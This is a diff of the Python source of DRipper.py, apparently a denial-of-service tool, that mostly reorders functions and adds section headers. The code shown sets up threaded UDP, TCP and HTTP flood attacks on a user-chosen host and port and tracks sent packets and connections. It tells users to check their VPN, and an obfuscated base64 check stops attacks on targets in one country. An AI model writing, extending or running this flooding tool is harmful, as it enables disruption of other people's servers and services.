@@ -18,7 +18,22 @@ from collections import defaultdict
 from os import urandom as randbytes
 from dataclasses import dataclass, field
 
+###############################################
+# Constants
+###############################################
+VERSION = 'v1.3.7'
+USAGE = 'Usage: python %prog [options] arg'
+EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
+GETTING_SERVER_IP_ERROR_MSG = red_txt('Can\'t get server IP. Packet sending failed. Check your VPN.')
+SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
+NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = red_txt('There are no successful connections more than 2 min. '
+                                              'Check your VPN or change host/port.')
+DEFAULT_CURRENT_IP_VALUE = '...detecting'
 
+
+###############################################
+#  Wrappers to print colorful messages
+###############################################
 def color_txt(color_code, *texts):
     joined_text = ''.join(str(x) for x in texts)
     return f'\033[{color_code}m{joined_text}\033[0;0m'
@@ -40,15 +55,9 @@ def pink_txt(*texts):
     return color_txt('95', *texts)
 
 
-# Constants
-VERSION = 'v1.3.7'
-USAGE = 'Usage: python %prog [options] arg'
-EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
-GETTING_SERVER_IP_ERROR_MSG = red_txt('Can\'t get server IP. Packet sending failed. Check your VPN.')
-SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
-NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = red_txt('There are no successful connections more than 2 min. '
-                                              'Check your VPN or change host/port.')
-DEFAULT_CURRENT_IP_VALUE = '...detecting'
+###############################################
+# DTO, general methods
+###############################################
 
 lock = threading.Lock()
 
@@ -155,6 +164,155 @@ def get_random_port():
     return random.choice(ports)
 
 
+def update_host_ip(_ctx: Context):
+    """Gets target's IP by host"""
+    try:
+        _ctx.host_ip = socket.gethostbyname(_ctx.host)
+    except:
+        pass
+
+
+def update_current_ip(_ctx: Context):
+    """Updates current ip"""
+    _ctx.getting_ip_in_progress = True
+    _ctx.current_ip = get_current_ip()
+    _ctx.getting_ip_in_progress = False
+    if _ctx.start_ip == '':
+        _ctx.start_ip = _ctx.current_ip
+
+
+def connect_host(_ctx: Context):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((_ctx.host, _ctx.port))
+    except:
+        _ctx.connections_failed += 1
+    else:
+        _ctx.connections_success += 1
+
+
+def get_first_ip_part(ip: str) -> str:
+    parts = ip.split('.')
+    if len(parts) > 1:
+        return f'{parts[0]}.*.*.*'
+    else:
+        return parts[0]
+
+
+def validate_input(args):
+    """Validates input params."""
+    if int(args.port) < 0:
+        print(red_txt('Wrong port number.'))
+        return False
+
+    if int(args.threads) < 1:
+        print(red_txt('Wrong threads number.'))
+        return False
+
+    if not args.host:
+        print(red_txt('Host wasn\'t detected'))
+        return False
+
+    if args.attack_method not in ('udp', 'tcp', 'http'):
+        print(red_txt('Wrong attack type. Possible options: udp, tcp, http.'))
+        return False
+
+    return True
+
+
+def validate_context(_ctx: Context):
+    """Validates context"""
+    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
+        print(red_txt('Could not connect to the host'))
+        return False
+
+    return True
+
+
+def go_home(_ctx: Context):
+    """Modifies host to match the rules"""
+    home_code = b64decode('dWE=').decode('utf-8')
+    if _ctx.host.endswith('.' + home_code.lower()) or get_host_country(_ctx.host_ip) in home_code.upper():
+        _ctx.host_ip = _ctx.host = 'localhost'
+        _ctx.original_host += '*'
+        update_url(_ctx)
+
+
+
+def create_thread_pool(_ctx: Context) -> list:
+    thread_pool = []
+    for i in range(int(_ctx.threads)):
+        if _ctx.attack_method == 'http':
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        elif _ctx.attack_method == 'tcp':
+            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
+        else:  # _ctx.attack_method == 'udp':
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+
+        thread_pool[i].daemon = True  # if thread is exist, it dies
+        thread_pool[i].start()
+
+    return thread_pool
+
+
+def get_current_ip():
+    """Gets user IP."""
+    current_ip = DEFAULT_CURRENT_IP_VALUE
+    try:
+        current_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+    except:
+        pass
+
+    return current_ip
+
+
+def get_host_country(host_ip):
+    """Gets country of the target's IP"""
+    country = 'NOT DEFINED'
+    try:
+        response_body = urllib.request.urlopen(f'https://ipinfo.io/{host_ip}').read().decode('utf8')
+        response_data = json.loads(response_body)
+        country = response_data['country']
+    except:
+        pass
+
+    return country
+
+
+def check_successful_connections(_ctx: Context):
+    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
+    curr_ms = time.time_ns()
+    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
+    if _ctx.connections_success == _ctx.connections_success_prev:
+        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
+            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+    else:
+        _ctx.connections_check_time = curr_ms
+        _ctx.connections_success_prev = _ctx.connections_success
+        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
+            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+
+
+def check_successful_tcp_attack(_ctx: Context):
+    """Checks if there are changes in sended bytes count."""
+    curr_ms = time.time_ns()
+    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
+    if _ctx.packets_sent == _ctx.packets_sent_prev:
+        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
+            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+    else:
+        _ctx.connections_check_time = curr_ms
+        _ctx.packets_sent_prev = _ctx.packets_sent
+        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
+            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+
+
+###############################################
+# Attack methods
+###############################################
 def down_it_udp(_ctx: Context):
     i = 1
     while True:
@@ -242,6 +400,9 @@ def down_it_tcp(_ctx: Context):
         time.sleep(.01)
 
 
+###############################################
+# Input parser, Logo, Help messages
+###############################################
 def logo():
     print(pink_txt(f'''
 
@@ -296,42 +457,6 @@ def parser_add_options(parser):
                       help='Attack to server IP')
 
 
-def update_host_ip(_ctx: Context):
-    """Gets target's IP by host"""
-    try:
-        _ctx.host_ip = socket.gethostbyname(_ctx.host)
-    except:
-        pass
-
-
-def update_current_ip(_ctx: Context):
-    """Updates current ip"""
-    _ctx.getting_ip_in_progress = True
-    _ctx.current_ip = get_current_ip()
-    _ctx.getting_ip_in_progress = False
-    if _ctx.start_ip == '':
-        _ctx.start_ip = _ctx.current_ip
-
-
-def connect_host(_ctx: Context):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((_ctx.host, _ctx.port))
-    except:
-        _ctx.connections_failed += 1
-    else:
-        _ctx.connections_success += 1
-
-
-def get_first_ip_part(ip: str) -> str:
-    parts = ip.split('.')
-    if len(parts) > 1:
-        return f'{parts[0]}.*.*.*'
-    else:
-        return parts[0]
-
-
 def show_info(_ctx: Context):
     """Prints attack info to console."""
     logo()
@@ -368,6 +493,9 @@ def show_info(_ctx: Context):
     sys.stdout.flush()
 
 
+###############################################
+# Statistic aggregations
+###############################################
 def build_http_codes_distribution(http_codes_counter):
     codes_distribution = []
     total = sum(http_codes_counter.values())
@@ -457,115 +585,9 @@ def get_cpu_load():
         return f"{cpu_usage:.2f}%"
 
 
-def create_thread_pool(_ctx: Context) -> list:
-    thread_pool = []
-    for i in range(int(_ctx.threads)):
-        if _ctx.attack_method == 'http':
-            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
-        elif _ctx.attack_method == 'tcp':
-            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
-        else:  # _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
-
-        thread_pool[i].daemon = True  # if thread is exist, it dies
-        thread_pool[i].start()
-
-    return thread_pool
-
-
-def get_current_ip():
-    """Gets user IP."""
-    current_ip = DEFAULT_CURRENT_IP_VALUE
-    try:
-        current_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
-    except:
-        pass
-
-    return current_ip
-
-
-def get_host_country(host_ip):
-    """Gets country of the target's IP"""
-    country = 'NOT DEFINED'
-    try:
-        response_body = urllib.request.urlopen(f'https://ipinfo.io/{host_ip}').read().decode('utf8')
-        response_data = json.loads(response_body)
-        country = response_data['country']
-    except:
-        pass
-
-    return country
-
-
-def check_successful_connections(_ctx: Context):
-    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
-    curr_ms = time.time_ns()
-    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
-    if _ctx.connections_success == _ctx.connections_success_prev:
-        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
-            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
-                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
-    else:
-        _ctx.connections_check_time = curr_ms
-        _ctx.connections_success_prev = _ctx.connections_success
-        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
-            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
-
-
-def check_successful_tcp_attack(_ctx: Context):
-    """Checks if there are changes in sended bytes count."""
-    curr_ms = time.time_ns()
-    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
-    if _ctx.packets_sent == _ctx.packets_sent_prev:
-        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
-            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
-                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
-    else:
-        _ctx.connections_check_time = curr_ms
-        _ctx.packets_sent_prev = _ctx.packets_sent
-        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
-            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
-
-
-def validate_input(args):
-    """Validates input params."""
-    if int(args.port) < 0:
-        print(red_txt('Wrong port number.'))
-        return False
-
-    if int(args.threads) < 1:
-        print(red_txt('Wrong threads number.'))
-        return False
-
-    if not args.host:
-        print(red_txt('Host wasn\'t detected'))
-        return False
-
-    if args.attack_method not in ('udp', 'tcp', 'http'):
-        print(red_txt('Wrong attack type. Possible options: udp, tcp, http.'))
-        return False
-
-    return True
-
-
-def validate_context(_ctx: Context):
-    """Validates context"""
-    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
-        print(red_txt('Could not connect to the host'))
-        return False
-
-    return True
-
-
-def go_home(_ctx: Context):
-    """Modifies host to match the rules"""
-    home_code = b64decode('dWE=').decode('utf-8')
-    if _ctx.host.endswith('.' + home_code.lower()) or get_host_country(_ctx.host_ip) in home_code.upper():
-        _ctx.host_ip = _ctx.host = 'localhost'
-        _ctx.original_host += '*'
-        update_url(_ctx)
-
-
+###############################################
+# Main
+###############################################
 def main():
     """The main function to run the script from the command line."""
     parser = OptionParser(usage=USAGE, epilog=EPILOG)
